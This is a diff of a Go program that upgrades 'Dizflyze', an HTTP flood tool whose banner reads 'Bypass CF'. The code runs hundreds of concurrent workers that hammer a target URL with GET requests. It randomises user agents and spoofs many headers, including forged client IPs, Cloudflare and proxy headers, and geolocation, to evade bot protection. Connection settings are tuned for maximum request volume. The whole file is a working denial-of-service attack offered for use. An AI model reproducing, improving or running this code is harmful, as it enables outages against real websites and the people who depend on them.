@@ -11,13 +11,13 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-
-	"github.com/corpix/uarand"
-	"golang.org/x/net/http2"
+	
+	fakeuseragent "github.com/EDDYCJY/fake-useragent"
 )
 
 var (
@@ -25,7 +25,7 @@ var (
 	requests     int64
 	successCount int64
 	failedCount  int64
-	concurrency  = 550
+	concurrency  = 550 // Sudah di seting pas.
 	referers     []string
 	secHeaders   []string
 	orgs         []string
@@ -56,7 +56,7 @@ var (
     "GG", "IM", "JE", "MC", "AD", "LI", "SM", "VA", "GI", "FO",
     "SJ", "XK", "MO", "IO", "CC", "CX", "NF", "PN", "GS", "UM",
 }
-	mu           sync.Mutex
+	mu sync.Mutex
 )
 
 const (
@@ -69,6 +69,12 @@ const (
 	Magenta = "\033[35m"
 )
 
+var headerPool = sync.Pool{
+	New: func() interface{} {
+		return make(http.Header)
+	},
+}
+
 func init() {
 	rand.Seed(time.Now().UnixNano())
 	initReferers()
@@ -76,10 +82,11 @@ func init() {
 	initDomains()
 	initPaths()
 	initSecHeaders()
+	runtime.GOMAXPROCS(runtime.NumCPU())
 }
 
 func initReferers() {
-    referers = []string{
+	referers = []string{
         "https://www.google.com/search?q=",
         "https://www.youtube.com/watch?v=",
         "https://www.facebook.com/",
@@ -404,68 +411,135 @@ func initReferers() {
 }
 
 func initSecHeaders() {
-	secHeaders = []string{
-		"Sec-CH-UA: \"Chromium\";v=\"121\", \"Not A;Brand\";v=\"99\"",
-		"Sec-CH-UA-Mobile: ?0",
-		"Sec-CH-UA-Platform: \"Windows\"",
-		"Sec-CH-UA-Platform-Version: \"15.0.0\"",
-		"Sec-CH-UA-Arch: \"x86\"",
-		"Sec-CH-UA-Bitness: \"64\"",
-		"Sec-CH-UA-Model: \"\"",
-		"Sec-CH-UA-Full-Version-List: \"Chromium\";v=\"121.0.6167.160\", \"Not A;Brand\";v=\"99.0.0.0\"",
-		"Sec-Fetch-Dest: document",
-		"Sec-Fetch-Mode: navigate",
-		"Sec-Fetch-Site: same-origin",
-		"Sec-Fetch-User: ?1",
-		"Sec-GPC: 1",
-		"Priority: u=1, i",
-		"Purpose: prefetch",
-		"Service-Worker-Navigation-Preload: true",
-		"CDN-Loop: cloudflare",
-		"CF-Visitor: {\"scheme\":\"https\"}",
-		"CF-Connecting-IP: 1.1.1.1",
-		"True-Client-IP: 1.1.1.1",
-		"X-Forwarded-Proto: https",
-		"X-Forwarded-Port: 443",
-		"X-Edge-Connect: mid",
-		"X-Request-ID: " + GUUID(),
-		"X-Correlation-ID: " + GUUID(),
-		"X-Client-Data: " + GCD(),
-		"X-Requested-With: XMLHttpRequest",
-		"X-CSRF-Token: " + GT(),
-		"X-API-Version: 3",
-		"X-Content-Type-Options: nosniff",
-		"X-DNS-Prefetch-Control: on",
-		"X-Download-Options: noopen",
-		"X-Frame-Options: SAMEORIGIN",
-		"X-Permitted-Cross-Domain-Policies: none",
-		"X-RateLimit-Limit: 100",
-		"X-RateLimit-Remaining: 99",
-		"X-RateLimit-Reset: " + fmt.Sprint(time.Now().Add(60*time.Second).Unix()),
-		"X-XSS-Protection: 1; mode=block",
-		"X-Debug-Info: debug=1",
-		"X-Request-Start: t=" + fmt.Sprint(time.Now().UnixMicro()),
-		"X-Client-Version: 3.2.1",
-		"X-Device-Id: " + GUUID(),
-		"X-Cloud-Trace-Context: " + GTID(),
-		"X-Forwarded-TLSClient-Cert: " + GCH(),
-		"X-Content-Duration: " + fmt.Sprint(rand.Intn(5000)),
-		"X-Content-Security-Policy: default-src 'self'",
-		"X-WebKit-CSP: default-src 'self'",
-		"X-Forwarded-Server: edge-server",
-		"X-Edge-Request-ID: " + GUUID(),
-		"X-Origin-Request-ID: " + GUUID(),
-		"X-Api-Key: " + GT(),
-		"X-Request-Signature: " + GT(),
-		"X-Cloudflare-Features: ssr",
-		"X-Cloudflare-Client: enterprise",
-		"X-Cloudflare-IP-Country: " + countries[rand.Intn(len(countries))],
-		"X-Cloudflare-IP-ASN: AS" + fmt.Sprint(rand.Intn(100000)),
-		"X-Cloudflare-IP-Organization: " + GON(),
-		"X-Edge-IP: " + GRIP(),
-		"X-Forwarded-Host: " + GFH(),
-		"X-Original-URL: /" + GFP(),
-	}
+    secHeaders = []string{
+        "Sec-CH-UA: \"Chromium\";v=\"121\", \"Google Chrome\";v=\"121\", \"Not-A.Brand\";v=\"99\"",
+        "Sec-CH-UA-Mobile: ?" + fmt.Sprint(rand.Intn(2)),
+        "Sec-CH-UA-Platform: \"" + []string{"Windows", "macOS", "Linux", "Android", "iOS"}[rand.Intn(5)] + "\"",
+        "Sec-CH-UA-Platform-Version: \"" + []string{"15.0.0", "14.0.0", "13.0.0", "12.0.0", "11.0.0"}[rand.Intn(5)] + "\"",
+        "Sec-CH-UA-Arch: \"" + []string{"x86", "arm", "arm64", "x86_64"}[rand.Intn(4)] + "\"",
+        "Sec-CH-UA-Bitness: \"" + []string{"64", "32", "64", "64"}[rand.Intn(4)] + "\"",
+        "Sec-CH-UA-Model: \"" + []string{"", "SM-G998B", "iPhone14,3", "Pixel 6", "Xiaomi 12"}[rand.Intn(5)] + "\"",
+        "Sec-CH-UA-Full-Version-List: \"Chromium\";v=\"121.0.6167.160\", \"Google Chrome\";v=\"121.0.6167.160\", \"Not-A.Brand\";v=\"99.0.0.0\"",
+        "Sec-CH-Prefers-Reduced-Motion: " + []string{"no-preference", "reduce"}[rand.Intn(2)],
+        "Sec-CH-Prefers-Color-Scheme: " + []string{"light", "dark", "no-preference"}[rand.Intn(3)],
+        "Sec-CH-Viewport-Width: " + fmt.Sprint(rand.Intn(2000)+800),
+        "Sec-CH-Viewport-Height: " + fmt.Sprint(rand.Intn(1000)+600),
+        "Sec-CH-DPR: " + fmt.Sprintf("%.1f", []float64{1.0, 1.5, 2.0, 3.0}[rand.Intn(4)]),
+        "Sec-CH-Width: " + fmt.Sprint(rand.Intn(2000)+800),
+        "Sec-CH-Device-Memory: " + []string{"0.25", "0.5", "1", "2", "4", "8"}[rand.Intn(6)],
+        "Sec-Fetch-Dest: " + []string{"document", "empty", "script", "style", "image", "font", "fetch", "xhr"}[rand.Intn(8)],
+        "Sec-Fetch-Mode: " + []string{"navigate", "cors", "no-cors", "same-origin", "websocket"}[rand.Intn(5)],
+        "Sec-Fetch-Site: " + []string{"same-origin", "same-site", "none", "cross-site"}[rand.Intn(4)],
+        "Sec-Fetch-User: ?" + fmt.Sprint(rand.Intn(2)),
+        "Sec-Purpose: " + []string{"prefetch", "preconnect", "prerender", "fetch"}[rand.Intn(4)],
+        "CF-Connecting-IP: " + GRIP(),
+        "CF-IPCountry: " + countries[rand.Intn(len(countries))],
+        "CF-RAY: " + fmt.Sprintf("%x-%s", time.Now().Unix(), countries[rand.Intn(len(countries))]),
+        "CF-Visitor: {\"scheme\":\"https\"}",
+        "CF-Request-ID: " + GUUID(),
+        "CF-EW-Via: " + []string{"v1-edge-01", "v1-edge-02", "v2-edge-01"}[rand.Intn(3)],
+        "CF-Edge-Cache-Status: " + []string{"MISS", "HIT", "EXPIRED", "STALE", "BYPASS"}[rand.Intn(5)],
+        "CF-Cache-Status: " + []string{"HIT", "MISS", "EXPIRED", "STALE", "BYPASS"}[rand.Intn(5)],
+        "CF-Origin-DNS: " + GRDN(),
+        "X-Forwarded-For: " + GRIP(),
+        "X-Forwarded-Proto: https",
+        "X-Forwarded-Port: 443",
+        "X-Forwarded-Host: " + GFH(),
+        "X-Forwarded-Server: " + GRDN(),
+        "X-Original-URL: /" + GFP(),
+        "X-Real-IP: " + GRIP(),
+        "True-Client-IP: " + GRIP(),
+        "Via: " + []string{"1.1 google", "1.1 cloudflare", "2.0 akamai"}[rand.Intn(3)],
+        "Forwarded: for=" + GRIP() + ";proto=https;host=" + GFH(),
+        "X-Proxy-Request: true",
+        "X-Proxy-ID: " + GUUID(),
+        "X-Proxy-User: " + []string{"anonymous", "authenticated"}[rand.Intn(2)],
+        "Content-Security-Policy: default-src 'self'",
+        "Content-Security-Policy-Report-Only: default-src 'self'",
+        "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
+        "X-Content-Type-Options: nosniff",
+        "X-Frame-Options: " + []string{"SAMEORIGIN", "DENY", "ALLOW-FROM https://example.com"}[rand.Intn(3)],
+        "X-XSS-Protection: 1; mode=block",
+        "Referrer-Policy: " + []string{"no-referrer", "strict-origin-when-cross-origin", "origin"}[rand.Intn(3)],
+        "Feature-Policy: " + []string{"geolocation 'none'", "camera 'none'", "microphone 'none'"}[rand.Intn(3)],
+        "Permissions-Policy: " + []string{"geolocation=(), camera=()", "microphone=()", "payment=()"}[rand.Intn(3)],
+        "Expect-CT: max-age=86400, enforce",
+        "Cross-Origin-Embedder-Policy: " + []string{"require-corp", "credentialless"}[rand.Intn(2)],
+        "Cross-Origin-Opener-Policy: " + []string{"same-origin", "same-origin-allow-popups"}[rand.Intn(2)],
+        "Cross-Origin-Resource-Policy: " + []string{"same-site", "cross-origin"}[rand.Intn(2)],
+        "Origin-Agent-Cluster: ?1",
+        "Early-Data: " + fmt.Sprint(rand.Intn(2)),
+        "Device-Memory: " + fmt.Sprint(1+rand.Intn(8)),
+        "DPR: " + fmt.Sprintf("%.1f", []float64{1.0, 1.5, 2.0, 3.0}[rand.Intn(4)]),
+        "Save-Data: " + []string{"on", "off"}[rand.Intn(2)],
+        "Viewport-Width: " + fmt.Sprint(rand.Intn(2000)+800),
+        "Width: " + fmt.Sprint(rand.Intn(2000)+800),
+        "Downlink: " + fmt.Sprintf("%.1f", 0.5+rand.Float64()*9.5),
+        "ECT: " + []string{"4g", "3g", "2g", "slow-2g"}[rand.Intn(4)],
+        "RTT: " + fmt.Sprint(rand.Intn(300)),
+        "Service-Worker-Navigation-Preload: true",
+        "X-Request-ID: " + GUUID(),
+        "X-Correlation-ID: " + GUUID(),
+        "X-Request-Start: t=" + fmt.Sprint(time.Now().UnixMicro()),
+        "X-Requested-With: XMLHttpRequest",
+        "X-CSRF-Token: " + GT(),
+        "X-API-Version: " + fmt.Sprint(rand.Intn(5)+1),
+        "X-API-Key: " + GT(),
+        "X-Auth-Token: " + GT(),
+        "X-Client-Version: " + fmt.Sprintf("%d.%d.%d", rand.Intn(5), rand.Intn(10), rand.Intn(100)),
+        "X-Device-ID: " + GUUID(),
+        "X-Device-Model: " + []string{"iPhone14,3", "SM-G998B", "Pixel 6"}[rand.Intn(3)],
+        "X-Device-OS: " + []string{"iOS 16.4", "Android 13", "Windows 11"}[rand.Intn(3)],
+        "X-Session-ID: " + GUUID(),
+        "X-Request-Signature: " + GT(),
+        "X-Requested-By: " + []string{"Dizflyze", "axios", "fetch", "XMLHttpRequest"}[rand.Intn(4)],
+        "X-Request-Type: " + []string{"Fetch", "XHR", "Beacon", "Preflight"}[rand.Intn(4)],
+        "X-Debug-Mode: " + fmt.Sprint(rand.Intn(2)),
+        "X-Trace-Id: " + GTID(),
+        "Accept-CH: Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Platform, Sec-CH-UA-Arch, Sec-CH-UA-Bitness",
+        "Critical-CH: Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Platform",
+        "Accept: " + []string{"text/html", "application/json", "application/xml", "*/*"}[rand.Intn(4)] + ";q=0.9",
+        "Accept-Encoding: gzip, deflate, br, zstd",
+        "Accept-Language: " + []string{"en-US", "en-GB", "de-DE", "fr-FR", "es-ES", "ja-JP"}[rand.Intn(6)] + ";q=0.9",
+        "User-Agent: " + fakeuseragent.Random(),
+        "Upgrade-Insecure-Requests: 1",
+        "TE: trailers",
+        "Connection: keep-alive",
+        "Keep-Alive: timeout=" + fmt.Sprint(5+rand.Intn(10)),
+        "X-Client-Geo-Location: " + fmt.Sprintf("%f,%f", -180+rand.Float64()*360, -90+rand.Float64()*180),
+        "X-Client-Geo-Country: " + countries[rand.Intn(len(countries))],
+        "X-Client-Geo-Region: " + []string{"CA-ON", "US-CA", "DE-BE", "FR-IDF", "JP-13"}[rand.Intn(5)],
+        "X-Client-Geo-City: " + []string{"New York", "London", "Tokyo", "Paris", "Berlin"}[rand.Intn(5)],
+        "X-Client-Geo-Postal-Code: " + fmt.Sprint(10000+rand.Intn(90000)),
+        "X-Client-Geo-Timezone: " + []string{"America/New_York", "Europe/London", "Asia/Tokyo"}[rand.Intn(3)],
+        "X-AWS-Request-ID: " + GUUID(),
+        "X-Azure-Client-IP: " + GRIP(),
+        "X-GCP-Project: project-" + GT()[:8],
+        "X-Google-Project-ID: project-" + GT()[:8],
+        "X-Google-Apps-Domain: " + GRDN(),
+        "X-Heroku-Request-ID: " + GUUID(),
+        "X-Vercel-Forwarded-For: " + GRIP(),
+        "X-Vercel-IP-Country: " + countries[rand.Intn(len(countries))],
+        "X-Amzn-Trace-Id: Root=" + fmt.Sprintf("1-%x", time.Now().Unix()) + "-" + GT()[:24],
+        "CDN-Loop: " + []string{"cloudflare", "akamai", "fastly", "cloudfront"}[rand.Intn(4)],
+        "X-Cache: " + []string{"HIT", "MISS", "EXPIRED"}[rand.Intn(3)],
+        "X-Cache-Hits: " + fmt.Sprint(rand.Intn(10)),
+        "X-Cache-Status: " + []string{"HIT", "MISS", "EXPIRED"}[rand.Intn(3)],
+        "X-Edge-Location: " + []string{"lax", "fra", "sin", "tyo", "syd"}[rand.Intn(5)] + "1-edge",
+        "X-Served-By: cache-" + []string{"lax", "fra", "sin", "tyo"}[rand.Intn(4)] + "1-edge",
+        "X-Timer: S" + fmt.Sprint(time.Now().Unix()) + ".000000,VS0,VE" + fmt.Sprint(rand.Intn(100)),
+        "X-Edge-Request-ID: " + GUUID(),
+        "X-Organization-Id: " + GT()[:8],
+        "X-User-Id: " + GT()[:12],
+        "X-Client-Name: " + []string{"web-app", "mobile-app", "api-client"}[rand.Intn(3)],
+        "X-Client-Channel: " + []string{"web", "mobile", "api", "partner"}[rand.Intn(4)],
+        "X-Request-Source: " + []string{"organic", "paid", "direct", "referral"}[rand.Intn(4)],
+        "X-AB-Test-Group: group-" + fmt.Sprint(rand.Intn(5)+1),
+        "X-Client-Locale: " + []string{"en_US", "en_GB", "de_DE", "fr_FR"}[rand.Intn(4)],
+        "X-Client-Timezone: " + fmt.Sprintf("UTC%+d", rand.Intn(13)-12),
+        "X-Client-Screen: " + fmt.Sprintf("%dx%d", 800+rand.Intn(2000), 600+rand.Intn(1000)),
+        "X-Client-Pixel-Ratio: " + fmt.Sprintf("%.1f", 1.0+rand.Float64()*2.0),
+    }
 }
 
 func GUUID() string {
@@ -910,20 +984,19 @@ func GRR() string {
 
 func L() {
 	fmt.Println(Cyan + `
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣄⠀
-⠀⠀⣴⣶⣶⣶⣶⣶⣾⣿⣿⡿⢿⣿⣿⣦⣤⣤⣤⣤⣤⣤⣶⣿⣿⣿⣿⣷
-⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟
-⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
-⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⠋⣿⡏⢹⡟⠉⣿⠉⠀⠀
-⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠈⠁⠀⠉⠀⠈⠁⠀⠉⠀⠀⠀
-⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣀⡀⠀⠀⣀⣠⣶⣦⠀⠀
-⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠉⠛⠿⣿⣿⣿⠿⠟⠋⠀⠀⠀
-⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⢀⡀⠀⣀⡀⢀⡀⠀⣀⠀⠀⠀
-⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣷⣾⣷⣶⣿⣶⣶⡀
-⠀⠻⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠛⠛⠋⠀⠀⠀⠀
-        ⠀    Dizflyze V6 - Bypass CF 
+⠀⠀⠀⠀⢀⠀⢀⣼⣷⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⡄⠀
+⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
+⠀⠀⠀⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣷⣿⣿⠋⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⡟⠛
+⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣝⣿⣽⣿⣿⣿⠿⣏⣉⡍⠉⠉⠉⠉⠙⠛⠻⠿⠿⠿⠿⣿⣿⣿⡇⠀
+⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣩⣿⣿⣿⣿⣿⣦⣈⣻⣃⣠⠶⠒⠒⠒⠒⠒⠛⠛⠛⠛⠛⠋⠉⠁⠀
+⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⣾⠋⠀⠀⣿⠃⠀⠀⠈⢳⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣷⣿⣄⠀⠀⠹⣆⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⠶⢤⣬⣧⣤⠶⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
+⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀     ⠀⠀
+⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀Dizflyze V7 - Bypass CF
+⣿⣿⣿⣿⣿⣿⣿⣿⡿⢸⡇⠀⠀⠀⠀⠀⠀
+⠘⠛⠛⠛⣿⣿⣿⣿⠣⢾⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ` + Reset)
 }
 
@@ -974,33 +1047,31 @@ func CH2T() *http.Transport {
 			MaxVersion:         tls.VersionTLS13,
 			CipherSuites: []uint16{
 				tls.TLS_AES_128_GCM_SHA256,
+				tls.TLS_CHACHA20_POLY1305_SHA256,
 			},
 			CurvePreferences: []tls.CurveID{
-				tls.X25519,
-				tls.CurveP256,
+				tls.X25519, tls.CurveP256,
 			},
-			NextProtos:         []string{"h2"},
-			ClientSessionCache: tls.NewLRUClientSessionCache(1000),
+			NextProtos:         []string{"h2", "http/1.1"},
+			ClientSessionCache: tls.NewLRUClientSessionCache(10000),
 		},
-		DisableKeepAlives:   false,
-		MaxIdleConns:        30000,
-		MaxIdleConnsPerHost: 30000,
-		MaxConnsPerHost:     0,
-		IdleConnTimeout:     3 * time.Second,
+		DisableKeepAlives:   false, // jangan true!
+		MaxIdleConns:        100000, // jangan di ubah
+		MaxIdleConnsPerHost: 50000, // jangan di ubah
+		IdleConnTimeout:     10 * time.Second, // jangan di ubah
 		DialContext: (&net.Dialer{
-			Timeout:   3 * time.Second,
-			KeepAlive: 3 * time.Second,
+			Timeout:   2 * time.Second, // jangan di ubah
+			KeepAlive: 15 * time.Second, // jangan di ubah
 			DualStack: true,
 		}).DialContext,
-		ForceAttemptHTTP2:     true,
-		TLSHandshakeTimeout:   3 * time.Second,
-		ExpectContinueTimeout: 1 * time.Second,
+		ForceAttemptHTTP2:     true, // http2 true
+		TLSHandshakeTimeout:   2 * time.Second, // jangan di ubah
+		ExpectContinueTimeout: 1 * time.Second, // jangan di ubah
 	}
 }
 
-func BAH(host string) http.Header {
-	h := http.Header{}
-	h.Set("User-Agent", uarand.GetRandom())
+func BAH(host string, h http.Header) {
+	h.Set("User-Agent", fakeuseragent.Random())
 	h.Set("Referer", GRR())
 	h.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
 	h.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8,ms;q=0.7")
@@ -1047,6 +1118,8 @@ func BAH(host string) http.Header {
 	h.Set("X-Cloudflare-IP-Country", countries[rand.Intn(len(countries))])
 	h.Set("X-Cloudflare-IP-ASN", fmt.Sprintf("AS%d", 100000+rand.Intn(900000)))
 	h.Set("X-Cloudflare-IP-Organization", GON())
+    h.Set("Sec-GPC", fmt.Sprint(rand.Intn(2)))
+    h.Set("Device-Memory", fmt.Sprint(1+rand.Intn(8)))
 	
 	for _, header := range GSH() {
 		parts := strings.SplitN(header, ":", 2)
@@ -1054,16 +1127,15 @@ func BAH(host string) http.Header {
 			h.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
 		}
 	}
-	
-	return h
 }
 
 func AW(target string, host string, wg *sync.WaitGroup, stopChan chan struct{}) {
 	defer wg.Done()
-	
+
+	transport := CH2T()
 	client := &http.Client{
-		Transport: CH2T(),
-		Timeout:   3 * time.Second,
+		Transport: transport,
+		Timeout:   2 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			return http.ErrUseLastResponse
 		},
@@ -1074,8 +1146,11 @@ func AW(target string, host string, wg *sync.WaitGroup, stopChan chan struct{}) 
 		case <-stopChan:
 			return
 		default:
+			h := headerPool.Get().(http.Header)
+			BAH(host, h)
+			
 			req, _ := http.NewRequest("GET", target, nil)
-			req.Header = BAH(host)
+			req.Header = h
 			
 			resp, err := client.Do(req)
 			if err == nil {
@@ -1089,6 +1164,11 @@ func AW(target string, host string, wg *sync.WaitGroup, stopChan chan struct{}) 
 			} else {
 				atomic.AddInt64(&failedCount, 1)
 			}
+			
+			for k := range h {
+				delete(h, k)
+			}
+			headerPool.Put(h)
 		}
 	}
 }
@@ -1110,12 +1190,9 @@ func main() {
 	HIP := RH(host)
 	ISP, ASN, CHS := GIPD(HIP)
 
-	duration := 1000 * time.Second
+	duration := 260 * time.Second // Waktu
 	stopChan := make(chan struct{})
 	var wg sync.WaitGroup
-
-	transport := CH2T()
-	http2.ConfigureTransport(transport)
 
 	for i := 0; i < concurrency; i++ {
 		wg.Add(1)
